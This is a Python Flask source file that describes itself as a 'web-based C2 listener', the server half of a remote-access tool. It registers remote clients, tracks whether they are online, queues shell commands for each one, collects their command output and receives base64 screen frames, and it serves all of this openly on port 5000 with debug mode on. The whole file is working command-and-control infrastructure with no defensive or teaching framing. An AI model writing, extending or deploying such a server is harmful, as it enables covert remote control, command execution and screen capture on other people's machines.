from flask import Flask, request, jsonify, render_template
from datetime import datetime, timedelta
import os
import json

app = Flask(__name__)
app.config['UPLOAD_FOLDER'] = './uploads'

CLIENTS_FILE = "clients.json"
HEARTBEAT_TIMEOUT = 60  # seconds

# Load clients from file on startup
if os.path.exists(CLIENTS_FILE):
    with open(CLIENTS_FILE, "r") as f:
        try:
            clients = json.load(f)
        except json.JSONDecodeError:
            clients = {}
else:
    clients = {}

commands = {}    # {client_id: command}
outputs = {}     # {client_id: last_output}
frames = {}      # {client_id: last_image_base64}

def save_clients():
    with open(CLIENTS_FILE, "w") as f:
        json.dump(clients, f)

@app.route('/')
def dashboard():
    return render_template('dashboard.html')

@app.route('/clients')
def get_clients():
    now = datetime.now()
    clients_with_status = {}

    for client_id, info in clients.items():
        try:
            last_seen_dt = datetime.strptime(info['last_seen'], '%Y-%m-%d %H:%M:%S')
        except:
            last_seen_dt = datetime.min  # fallback if parsing fails
        delta = (now - last_seen_dt).total_seconds()
        status = 'online' if delta <= HEARTBEAT_TIMEOUT else 'offline'

        clients_with_status[client_id] = {
            'ip': info['ip'],
            'last_seen': info['last_seen'],
            'status': status
        }

    return jsonify(clients_with_status)

@app.route('/register', methods=['POST'])
def register():
    client_id = request.json.get('id')
    ip = request.remote_addr
    clients[client_id] = {
        'ip': ip,
        'last_seen': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
        'status': 'active'
    }
    save_clients()
    print(f"[+] Registered client: {client_id} from {ip}")
    return jsonify({'status': 'registered'})

@app.route('/heartbeat/<client_id>', methods=['POST'])
def heartbeat(client_id):
    if client_id in clients:
        clients[client_id]['last_seen'] = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        save_clients()
    return jsonify({'status': 'alive'})

@app.route('/command/<client_id>', methods=['GET', 'POST'])
def command(client_id):
    if request.method == 'POST':
        cmd = request.json.get('cmd')
        commands[client_id] = cmd
        print(f"[>] Command to {client_id}: {cmd}")
        return jsonify({'status': 'sent'})
    else:
        cmd = commands.pop(client_id, "")
        return jsonify({'cmd': cmd})

@app.route('/output/<client_id>', methods=['POST', 'GET'])
def output(client_id):
    if request.method == 'POST':
        output = request.json.get('output')
        outputs[client_id] = output
        print(f"[{client_id}] >>> {output}")
        return jsonify({'status': 'received'})
    else:
        return jsonify({'output': outputs.get(client_id, "")})

@app.route('/frame/<client_id>', methods=['POST', 'GET'])
def frame(client_id):
    if request.method == 'POST':
        img_b64 = request.json.get('frame')
        frames[client_id] = img_b64
        return jsonify({'status': 'frame_received'})
    else:
        return jsonify({'frame': frames.get(client_id, "")})

if __name__ == "__main__":
    print("[*] Starting web-based C2 listener on http://0.0.0.0:5000")
    app.run(host="0.0.0.0", port=5000, debug=True)
